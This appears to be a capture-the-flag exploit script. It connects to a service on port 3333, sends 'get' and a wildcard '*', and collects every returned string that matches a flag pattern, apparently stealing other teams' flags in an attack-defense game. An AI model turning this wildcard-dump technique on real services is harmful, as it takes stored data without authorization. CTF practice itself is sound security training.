import sys
import re
import socket
from time import sleep, time
#ip = "6.6.{}.2:2943"
host = sys.argv[1]

def read_until(s, delim=b':'):
    buf = b''
    while not buf.endswith(delim):
        buf += s.recv(1)
    return buf
    
def read_until_flag(s, delim=b'\n\n'):
    buf = b''
    begin=time()
    timeout = 2
    while 1:
        if buf and time()-begin > timeout:
            break
        buf += s.recv(1)
    return buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 3333))
    print(read_until(s, b'?'))
    s.sendall(b"get\n")
    print(read_until(s, b'?'))
    s.sendall(b"*\n")
    result = read_until_flag(s).decode()
    for flag in re.findall(r"[A-Z0-9]{31}=", result):
        print(flag, flush=True)

except Exception as e:
    print(e)
